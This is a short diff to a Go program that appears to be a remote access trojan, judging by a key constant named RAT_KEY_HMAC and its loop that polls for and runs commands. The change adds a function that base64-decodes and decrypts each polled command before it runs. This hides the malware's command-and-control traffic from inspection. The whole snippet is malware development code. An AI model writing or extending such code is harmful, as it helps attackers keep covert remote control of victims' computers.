@@ -1622,6 +1622,21 @@ func DecryptPacket(ctx *PacketEncryptionContext, encryptedData []byte) ([]byte, 
     return encryptedData, nil
 }
 
+func decryptPolledCommand(wireBody string, ctx *PacketEncryptionContext) (string, error) {
+    if wireBody == "" || ctx == nil {
+        return "", errors.New("empty polled command")
+    }
+    raw, err := base64.StdEncoding.DecodeString(wireBody)
+    if err != nil {
+        return "", err
+    }
+    plain, err := DecryptPacket(ctx, raw)
+    if err != nil {
+        return "", err
+    }
+    return string(plain), nil
+}
+
 func signWireBody(data []byte) string {
     mac := hmac.New(sha256.New, []byte(RAT_KEY_HMAC))
     mac.Write(data)
@@ -1997,6 +2012,10 @@ func main() {
             }
 
             command := strings.TrimSpace(string(body))
+            if decryptedCommand, dErr := decryptPolledCommand(command, encryptionCtx); dErr == nil {
+                command = decryptedCommand
+            }
+            command = strings.TrimSpace(command)
             if command == "" {
                 return
             }
